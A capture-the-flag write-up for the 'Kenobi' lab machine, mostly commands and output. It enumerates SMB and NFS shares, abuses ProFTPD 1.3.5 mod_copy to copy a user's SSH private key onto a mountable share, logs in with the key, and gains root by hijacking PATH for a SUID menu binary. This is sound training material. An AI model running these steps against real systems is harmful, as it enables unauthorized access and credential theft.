# Kenobi
----

## Port Scanning
```sh
nmap -sS -sV -O kenobi >> ports.txt

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 21:10 EDT
Nmap scan report for kenobi (10.10.75.33)
Host is up (0.17s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          ProFTPD 1.3.5
22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind      2-4 (RPC #100000)
139/tcp  open  netbios-ssn?
445/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs          2-4 (RPC #100003)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

```
### Samba
![image](https://github.com/user-attachments/assets/9272d0a8-8aa8-4363-be39-e082568b9d88)
- **Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system. Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.**
![image-1](https://github.com/user-attachments/assets/529e7cf2-d792-4d14-8076-d82c0042b8fa)
```sh
└─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.75.33

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.75.33\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.75.33\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.75.33\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 27.01 seconds
                                                
```
- **SMB enumeration**
```sh
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.75.33
```
- **Getting into SMB anonymous client**
```sh
smbclient //10.10.75.33/anonymous
```
- **Viewing the file we use `more filename.txt` in smb client**

- **For recursively downloading smb client**
```sh
smbget -R smb://10.10.75.33/anonymous
```

### RPCbind

![image-2](https://github.com/user-attachments/assets/4950019a-f3a0-41fc-8d45-2be2a2b82efe)
```sh
└─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.75.33
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 21:33 EDT
Nmap scan report for kenobi (10.10.75.33)
Host is up (0.17s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
                                          
```
- We can also check via nfs showmount because nfs is also open port

```sh
└─$ showmount -e kenobi
Export list for kenobi:
/var *
```

### ProFtpD

```sh
└─$ searchsploit proftp 1.3.5
------------------------------------------------- ---------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Me | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execut | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execut | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                        | linux/remote/36742.txt
-----------------------------
```

![image-3](https://github.com/user-attachments/assets/f7fe6588-239c-4085-87e0-1464d5efe99e)

```sh
└─$ nc kenobi 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.75.33]
SITE CPFR /home/kenobi/.ssh/id_rse\
550 /home/kenobi/.ssh/id_rse\: No such file or directory
SITE CPFR /home/kenobi/.ssh/id_rsa 
350 File or directory exists, ready for destination name
 SITE CPTO /var/tmp/id_rsa
500 Invalid command: try being more creative
SITE CPFR /home/kenobi/.ssh/id_rsa 
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

```
- Now its time for mounting to `/var`

```sh
──(root㉿kali)-[/mnt]
└─# mount kenobi:/var /mnt/kenobi 
                                                                                   
┌──(root㉿kali)-[/mnt]
└─# ls -la /mnt/kenobi 
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  3 root root  4096 Aug  9 21:45 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root _ssh  4096 Sep  4  2019 log
drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4096 Jan 29  2019 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  6 root root  4096 Aug  9 21:42 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www

```

```sh
┌──(root㉿kali)-[/mnt]
└─# cp /mnt/kenobi/tmp/id_rsa .
                                                                                   
┌──(root㉿kali)-[/mnt]
└─# ls                                      
id_rsa  kenobi
                                                                                   
┌──(root㉿kali)-[/mnt]
└─# ls -la            
total 16
drwxr-xr-x  3 root root 4096 Aug  9 21:49 .
drwxr-xr-x 20 root root 4096 Aug  9 21:45 ..
-rw-r--r--  1 root root 1675 Aug  9 21:49 id_rsa
drwxr-xr-x 14 root root 4096 Sep  4  2019 kenobi
                                                   
```

- **Copying file to current folder from nfs mount**

```sh
 cp /mnt/kenobi/tmp/id_rsa .
```  

```sh
                                                                                   
┌──(root㉿kali)-[/mnt]
└─# sudo chmod 600 id_rsa 
                                                                                   
┌──(root㉿kali)-[/mnt]
└─# ssh -i id_rsa kenobi@10.10.75.33
The authenticity of host '10.10.75.33 (10.10.75.33)' can't be established.
ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.75.33' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt 
d0b0f3f53b6caa532a83915e19224899
```

### PrivEsc

![image-4](https://github.com/user-attachments/assets/20d57f71-ddb3-463b-a0f0-9f0bd1b42301)

```sh
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# cat /root/root.txt
177b3cd8562289f37382721c28381f02

```
